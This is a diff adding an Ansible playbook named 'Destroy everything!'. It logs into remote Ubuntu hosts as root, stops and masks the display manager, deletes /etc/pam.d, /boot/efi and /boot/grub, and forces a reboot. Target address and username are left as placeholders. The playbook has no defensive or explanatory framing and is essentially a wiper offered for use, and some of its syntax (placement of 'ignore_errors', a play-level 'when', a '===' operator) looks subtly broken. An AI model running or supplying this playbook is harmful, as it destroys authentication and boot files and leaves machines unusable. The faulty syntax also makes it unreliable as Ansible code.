@@ -1,0 +1,44 @@
+---
+- name: "Destroy everything!"
+  hosts: INSERT_REMOTE_ADDRESS_HERE
+  # - OR UNCOMMENT THIS TO ADD
+  # - MULTIPLE REMOTE ADDRESSES
+  # - AS A LIST
+  remote_user: INSERT_REMOTE_USERNAME_HERE
+  become: yes
+  become_method: su
+  become_user: root
+  tasks:
+    - name: "Disable and stop gdm for extra confusion"
+      systemd:
+        name: gdm
+        state: stopped
+        masked: yes
+        enabled: no
+        force: yes
+        no_block: yes
+        ignore_errors: yes
+    - name: "Wipe the /etc/pam.d directory - bye bye authentication!"
+      file:
+        path: /etc/pam.d
+        state: absent
+        ignore_errors: yes
+        unsafe_writes: yes
+    - name: "Wipe the /boot/efi directory"
+      file:
+        path: /boot/efi
+        state: absent
+        ignore_errors: yes
+        unsafe_writes: yes
+    - name: "Wipe the /boot/grub directory"
+      file:
+        path: /boot/grub
+        state: absent
+        ignore_errors: yes
+        unsafe_writes: yes
+    - name: "Forced reboot - goodbye machine!"
+      reboot:
+        msg: "Goodbye!"
+        reboot_timeout: 5
+        ignore_errors: yes
+  when: ansible_facts['lsb']['id']|lower === 'ubuntu'
